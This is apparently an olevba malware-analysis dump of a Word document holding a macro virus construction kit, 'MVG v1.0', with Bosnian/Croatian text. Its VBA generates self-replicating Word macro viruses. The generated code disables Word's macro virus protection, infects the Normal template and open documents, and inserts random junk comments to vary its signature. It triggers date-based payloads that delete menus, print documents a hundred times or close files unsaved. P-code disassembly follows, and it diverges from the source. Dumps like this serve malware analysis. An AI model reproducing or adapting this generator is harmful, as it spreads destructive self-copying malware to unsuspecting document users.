olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.MVG
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error GoTo kraj
Application.WindowState = wdWindowStateMinimize
stform.Show
kraj:
End Sub
-------------------------------------------------------------------------------
VBA MACRO stform.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/stform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cm1_click()
MsgBox "MVG v1.0 je u beta fazi. Nisam otkrio nikakve bug-ove, no ako ih otkrijes znaj da je ovo BETA verzija Macro Virus Generator-a. Uzivaj!", vbInformation, "MVG v1.0 - Doborodosli!"
Unload stform
glavna.Show
End Sub

Private Sub Image1_Click()
MsgBox "hehehe...hehe...naci cete mozda neke skrivene opcije u ovoj alatki!", vbInformation, "MVG v1.0 - Tips!"
End Sub
-------------------------------------------------------------------------------
VBA MACRO glavna.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/glavna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'==============================================================
Public a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, r, s, t
'==============================================================

Private Sub autor_Click()
autorforma.Show
End Sub

Private Sub dani_Change()
If dani.Text <> "" Then
sec.Enabled = 1: tulzbris.Enabled = 1: insertbris.Enabled = 1
min.Enabled = 1: dani.Enabled = 1: brisvemen.Enabled = 1
selec.Enabled = 1: zaselec.Enabled = 1: printbes.Enabled = 1
odmahclose.Enabled = True
End If
End Sub

Private Sub gret_Click()
gretforma.Show
End Sub

Private Sub Image1_Click()
Dim a As Integer
a = 2 * (Rnd * 2 + 1)
If a = 2 Then
MsgBox "Kad sve izgleda da umire, ono se ustvari radja", vbInformation, "MVG v1.0 - poetry!"
Else
If a = 4 Then
MsgBox "Neko skenira moju dusu...HEJ! averzu prestani sa skeniranjem!!", vbInformation, "MVG v1.0 - agony!"
Else
If a = 6 Then
MsgBox "hmmm....this is strange..somehow I moved....", vbInformation, "MVG v1.0 - mist!"
End If
End If
End If
End Sub

Private Sub Image2_Click()
MsgBox "Visio.NoFrx.d is coming soon on ur 'puters!  ....'till then, Stay tooned!", vbCritical, "MVG v1.0 - TIP!!!"
End Sub

Private Sub izlaz_Click()
userexit.Show
End Sub

Private Sub kont_Click()
kontakti.Show
End Sub

Private Sub min_Change()
If min.Text <> "" Then
sec.Enabled = 1: tulzbris.Enabled = 1: insertbris.Enabled = 1
min.Enabled = 1: dani.Enabled = 1: brisvemen.Enabled = 1
selec.Enabled = 1: zaselec.Enabled = 1: printbes.Enabled = 1
odmahclose.Enabled = True
End If
End Sub

Private Sub mvginfo_Click()
infomvg.Show
End Sub

Private Sub opcije2_Click()
payforma.Show
End Sub

Private Sub sati_Change()
If sati.Text <> "" Then
sec.Enabled = 1: tulzbris.Enabled = 1: insertbris.Enabled = 1
min.Enabled = 1: dani.Enabled = 1: brisvemen.Enabled = 1
selec.Enabled = 1: zaselec.Enabled = 1: printbes.Enabled = 1
odmahclose.Enabled = True
End If

End Sub

Private Sub sec_Change()
If sec.Text <> "" Then
sec.Enabled = 1: tulzbris.Enabled = 1: insertbris.Enabled = 1
min.Enabled = 1: dani.Enabled = 1: brisvemen.Enabled = 1
selec.Enabled = 1: zaselec.Enabled = 1: printbes.Enabled = 1
odmahclose.Enabled = True
End If
End Sub

Private Sub selec_Click()
If selec.Value = True Then
With zaselec
.Enabled = True
.Locked = False
End With
Else
With zaselec
.Enabled = False
End With
End If
End Sub

Public Sub start_Click()
'===[ varijable za time payload ]========================
a = sec.Text: b = min.Text: c = sati.Text: d = dani.Text
'===[ varijable za HOOK infekciju ]======================
g = op1.Value: h = op2.Value: i = op3.Value
'===[ varijable za MENU opcije ]=========================
j = tulzbris.Value: k = insertbris.Value
l = brisvemen.Value
'===[ varijable za Razne Stvarke ]=======================
m = selec.Value: n = printbes.Value: o = odmahclose.Value

'===[ varijabla za selec ]===============================
p = zaselec.Text
'===[ kraj definisanja varijabli ]=======================

'Pocetak ispisa u txt datoteku...
If op1.Value = False And op2.Value = False And op3.Value = False Then
MsgBox "Mora postojati HOOK infekcije!", vbCritical, "MVG v1.0 - Fatal error!"
End If
MsgBox "Virus ce biti kreiran na Desktop-u!", vbInformation, "MVG v1.0 - Tip!"
vir_ime = InputBox("Unesite ime virusa: ", "MVG v1.0")
aut_ime = InputBox("Vas nick: ", "MVG v1.0")
If vir_ime = "" Then
vir_ime = "default"
MsgBox "Posto niste upisali ime virusa, za ime je uzeto default!", vbInformation, "MVG v1.0 - Tip!"
End If
If aut_ime = "" Then
aut_ime = "NoBody"
End If
pro.Caption = "Progres u toku..."
ProgressBar1.Value = 3
Open "c:\Windows\desktop\" & vir_ime & ".txt" For Output As #1
If op1.Value = True Then
Print #1, "Private Sub Document_Open()"
Else
If op2.Value = True Then
Print #1, "Private Sub Document_Close()"
Else
If op3.Value = True Then
Print #1, "Private Sub Document_New()"
End If
End If
End If
ProgressBar1.Value = 6
Print #1, "Const jedan = 1: nula = 2*0: verzija = (10 - 1)"
Print #1, "With Options"
Print #1, ".VirusProtection = nula"
Print #1, "End With"
ProgressBar1.Value = 10
Print #1, "If Application.Version = verzija & " & Chr(34) & "." & Chr(34) & " & nula Then "
Print #1, "GoTo pocni"
Print #1, "aha:"
Print #1, "GoTo startaj"
Print #1, "startaj:"
Print #1, "GoTo aha"
ProgressBar1.Value = 13
Print #1, "pocni:"
Print #1, "Set vx = ThisDocument.VBProject: Set ma = vx.VBComponents(jedan):"
Print #1, "ve = ma.CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(jedan).CodeModule.CountOfLines)"
Print #1, "If nt <> ve Then"
Print #1, "Set infnt = NormalTemplate.VBProject.VBComponents(jedan).CodeModule"
Print #1, "infnt.DeleteLines 1, infnt.CountOfLines"
ProgressBar1.Value = 20
Print #1, "infnt.AddFromString ve"
Print #1, "End If"
Print #1, "Set we = NormalTemplate.VBProject: Set ku = we.VBComponents(jedan):"
Print #1, "nt = ku.CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
Print #1, "If ad <> ve Then"
ProgressBar1.Value = 24
Print #1, "Set INFAD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
Print #1, "INFAD.DeleteLines 1, INFAD.CountOfLines"
Print #1, "INFAD.AddFromString ve"
Print #1, "Set vo = ActiveDocument.VBProject: Set gr = vo.VBComponents(jedan):"
Print #1, "ad = gr.CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(jedan).CodeModule.CountOfLines)"
Print #1, "End If"
Print #1, "End If"
ProgressBar1.Value = 28
If rcj.Value = True Then
GoTo stavi
Else: GoTo dalje
End If
stavi:
Print #1, "Dim KSJDHFE, PODFGHN, ZXCASDF, PIOUWER, A, B, QWPEOIS"
Print #1, "adf = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines"
Print #1, "For ah = 1 To adf"
Print #1, "dg = Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(ah, 1), 1, 1)"
Print #1, "If dg = " & Chr(34) & "'" & Chr(34) & " Then ThisDocument.VBProject.VBComponents(1).CodeModule.DeleteLines ah, 1"
Print #1, "Next ah"
      Print #1, "For KSJDHFE = 10 To 1 Step -2"
            Print #1, "For PODFGHN = 0 To 2"
Print #1, "ZXCASDF = Chr(Rnd * 105 + 1) & Asc(Chr(Rnd * 10 + 1))"
            Print #1, "QWPEOIS = Hex(Rnd * 120 + 4)"
            Print #1, "PIOUWER = ZXCASDF & PIOUWER & QWPEOIS"
            Print #1, "Next PODFGHN"
      Print #1, "Next KSJDHFE"
Print #1, "Set AdAcTiV = ActiveDocument.VBProject.VBComponents(1).CodeModule"
Print #1, "For c = 1 To AdAcTiV.CountOfLines + 38 Step 2"
Print #1, "AdAcTiV.insertlines c + 1, " & Chr(34) & "'" & Chr(34) & " & PIOUWER"
Print #1, "Next c"
dalje:
ProgressBar1.Value = 34
If sec.Text <> "" And min.Text <> "" And sati.Text <> "" And dani.Text <> "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Minute(Now()) = " & b & " And " & "Hour(Now()) = " & c & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Delete"""
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"""
Else
If l = True Then
End If
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
End If
ProgressBar1.Value = 39
If sec.Text <> "" And min.Text = "" And sati.Text = "" And dani.Text = "" Then
Print #1, "If Second(Now()) =  "; a; ""
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
End If
End If
ProgressBar1.Value = 44
If sec.Text <> "" And min.Text <> "" And sati.Text = "" And dani.Text = "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Minute(Now()) = " & b & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
End If
End If
ProgressBar1.Value = 50
If sec.Text <> "" And min.Text <> "" And sati.Text <> "" And dani.Text = "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Minute(Now()) = " & b & " And " & "Hour(Now()) = " & c & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 56
If sec.Text <> "" And min.Text = "" And sati.Text <> "" And dani.Text = "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Hour(Now()) = " & c & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 59
If sec.Text <> "" And min.Text = "" And sati.Text = "" And dani.Text <> "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & Chr(34) & zaselec.Text & Chr(34) & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 60
If sec.Text <> "" And min.Text = "" And sati.Text <> "" And dani.Text <> "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Hour(Now()) = " & c & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 67
If sec.Text = "" And min.Text <> "" And sati.Text <> "" And dani.Text <> "" Then
Print #1, "If Minute(Now()) = " & b & " And " & "Hour(Now()) = " & c & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
ProgressBar1.Value = 69
If sec.Text = "" And min.Text = "" And sati.Text <> "" And dani.Text <> "" Then
Print #1, "If Hour(Now()) = " & c & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 75
If sec.Text = "" And min.Text <> "" And sati.Text <> "" And dani.Text = "" Then
Print #1, "If Minute(Now()) = " & b & " And " & "Hour(Now()) = " & c & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
ProgressBar1.Value = 80
If sec.Text = "" And min.Text <> "" And sati.Text = "" And dani.Text <> "" Then
Print #1, "If Minute(Now()) = " & b & " And " & "Hour(Now()) = " & c & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 95
If sec.Text <> "" And min.Text <> "" And sati.Text = "" And dani.Text <> "" Then
Print #1, "If Second(Now()) = " & a & " And " & "Minute(Now()) = " & b & " And " & "Day(Now()) = " & d & " then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 97
If sec.Text = "" And min.Text = "" And sati.Text <> "" And dani.Text = "" Then
Print #1, "If Hour(Now)) = " & c & " Then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 98
If sec.Text = "" And min.Text = "" And sati.Text = "" And dani.Text <> "" Then
Print #1, "If Day(Now()) = " & d & " Then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 99
If sec.Text = "" And min.Text <> "" And sati.Text = "" And dani.Text = "" Then
Print #1, "If Minute(Now()) = " & b & " Then"
If j = True Then
Print #1, "CommandBars(""Tools"").Delete"
Else
If k = True Then
Print #1, "CommandBars(""Insert"").Delete"
Else
If l = True Then
Print #1, "For ERTIGA = 1 To CommandBars.Count"
Print #1, "CommandBars(ERTIGA).Delete"
Print #1, "Next ERTIGA"
End If
End If
If selec.Value = True Then
Print #1, "Selection.Text = " & zaselec.Text & ""
Else
If printbes.Value = True Then
Print #1, "For X = 1 To 100"
Print #1, "ActiveDocument.PrintOut"
Print #1, "Next X"
Else
If odmahclose.Value = True Then
Print #1, "ActiveDocument.Close SaveChanges:=False"
End If
End If
End If
End If
End If
ProgressBar1.Value = 99.5
Print #1, "'WordMacro." & vir_ime & " by " & aut_ime
Print #1, "'RCJ v1.0 (Random Comment Junker) by e[ax]"
If sec.Text <> "" Or sati.Text <> "" Or min.Text <> "" Or dani.Text <> "" Then
Print #1, "End If"
End If
Print #1, "End Sub"
Close #1
ProgressBar1.Value = 100
pro.Caption = "Progres zavrsen!"
MsgBox "Virus WM." & vir_ime & " uspjesno kreiran!!!", vbOKOnly, "MVG v1.0 - Info!"
pro.Caption = "MVG v1.0"
ProgressBar1.Value = 0
End Sub
Private Sub UserForm_Click()
w97m_serpent.Show
End Sub
Sub novi_start()
glavna.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO autorforma.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/autorforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton3_Click()
Unload Me
End Sub

-------------------------------------------------------------------------------
VBA MACRO gretforma.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/gretforma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Unload Me
End Sub

-------------------------------------------------------------------------------
VBA MACRO infomvg.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/infomvg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Image1_Click()
MsgBox "...u ovoj divljini od informatike jedini virusi koji mogu opstati su macro virusi, dobro programirani Win32 i multipartite virusi!", vbInformation, "MVG v1.0 - Tips!"
End Sub

Private Sub Label2_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO kontakti.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/kontakti'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmurl_Click()
If Dir("C:\Program Files\Internet Explorer\IEXPLORE.EXE") <> "IEXPLORE.EXE" Then
MsgBox "Internet Explorer nije instaliran!", vbCritical, "MVG v1.0 - error"
Else
Shell "C:\Program Files\Internet Explorer\IEXPLORE.EXE virlab.cjb.net", vbNormalFocus
End If
End Sub

Private Sub CommandButton2_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO userexit.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/userexit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Application.WindowState = wdWindowStateNormal
End
End Sub
Private Sub CommandButton2_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO w97m_serpent.frm 
in file: Constructor.MSWord.MVG - OLE stream: 'Macros/VBA/w97m_serpent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Label2_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Constructor.MSWord.MVG
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3937 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError kraj 
' Line #2:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #3:
' 	Ld stform 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	Label kraj 
' Line #5:
' 	EndSub 
' Macros/VBA/stform - 3209 bytes
' Line #0:
' 	FuncDefn (Private Sub cm1_click())
' Line #1:
' 	LitStr 0x0086 "MVG v1.0 je u beta fazi. Nisam otkrio nikakve bug-ove, no ako ih otkrijes znaj da je ovo BETA verzija Macro Virus Generator-a. Uzivaj!"
' 	Ld mvginfo_Click 
' 	LitStr 0x0017 "MVG v1.0 - Doborodosli!"
' 	ArgsCall MsgBox 0x0003 
' Line #2:
' 	Ld stform 
' 	ArgsCall Unload 0x0001 
' Line #3:
' 	Ld glavna 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Image1_Click())
' Line #7:
' 	LitStr 0x0043 "hehehe...hehe...naci cete mozda neke skrivene opcije u ovoj alatki!"
' 	Ld mvginfo_Click 
' 	LitStr 0x0010 "MVG v1.0 - Tips!"
' 	ArgsCall MsgBox 0x0003 
' Line #8:
' 	EndSub 
' Macros/VBA/glavna - 42339 bytes
' Line #0:
' 	QuoteRem 0x0000 0x003E "=============================================================="
' Line #1:
' 	Dim (Public) 
' 	VarDefn start_opcija
' 	VarDefn B
' 	VarDefn d
' 	VarDefn e
' 	VarDefn g
' 	VarDefn F
' 	VarDefn h
' 	VarDefn i
' 	VarDefn k
' 	VarDefn Sections
' 	VarDefn l
' 	VarDefn textbox7
' 	VarDefn n
' 	VarDefn o
' 	VarDefn brissvemen
' 	VarDefn tulzmen
' 	VarDefn t
' 	VarDefn wiht
' 	VarDefn u
' Line #2:
' 	QuoteRem 0x0000 0x003E "=============================================================="
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub autor_Click())
' Line #5:
' 	Ld autorforma 
' 	ArgsMemCall Show 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub PrintOut())
' Line #9:
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld min 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld insertbris 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld brisvemen 
' 	MemSt Execute 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld sati 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld mjesec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld OptionButton1 
' 	MemSt Execute 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld odmahclose 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld selec 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld closeme_now 
' 	MemSt Execute 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld p 
' 	MemSt Execute 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub gret_Click())
' Line #18:
' 	Ld gretforma 
' 	ArgsMemCall Show 0x0000 
' Line #19:
' 	EndSub 
' Line #20:
' Line #21:
' 	FuncDefn (Private Sub Image1_Click())
' Line #22:
' 	Dim 
' 	VarDefn start_opcija (As Integer)
' Line #23:
' 	LitDI2 0x0002 
' 	Ld rn 
' 	LitDI2 0x0002 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Mul 
' 	St start_opcija 
' Line #24:
' 	Ld start_opcija 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitStr 0x002E "Kad sve izgleda da umire, ono se ustvari radja"
' 	Ld mvginfo_Click 
' 	LitStr 0x0012 "MVG v1.0 - poetry!"
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	Ld start_opcija 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitStr 0x003E "Neko skenira moju dusu...HEJ! averzu prestani sa skeniranjem!!"
' 	Ld mvginfo_Click 
' 	LitStr 0x0011 "MVG v1.0 - agony!"
' 	ArgsCall MsgBox 0x0003 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	Ld start_opcija 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitStr 0x002C "hmmm....this is strange..somehow I moved...."
' 	Ld mvginfo_Click 
' 	LitStr 0x0010 "MVG v1.0 - mist!"
' 	ArgsCall MsgBox 0x0003 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub Class1())
' Line #38:
' 	LitStr 0x0049 "Visio.NoFrx.d is coming soon on ur 'puters!  ....'till then, Stay tooned!"
' 	Ld vbCritical 
' 	LitStr 0x0011 "MVG v1.0 - TIP!!!"
' 	ArgsCall MsgBox 0x0003 
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' 	FuncDefn (Private Sub izlaz_Click())
' Line #42:
' 	Ld start 
' 	ArgsMemCall Show 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub opcije2_Click())
' Line #46:
' 	Ld cmurl 
' 	ArgsMemCall Show 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Private Sub sati_Change())
' Line #50:
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld min 
' 	MemSt Execute 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld insertbris 
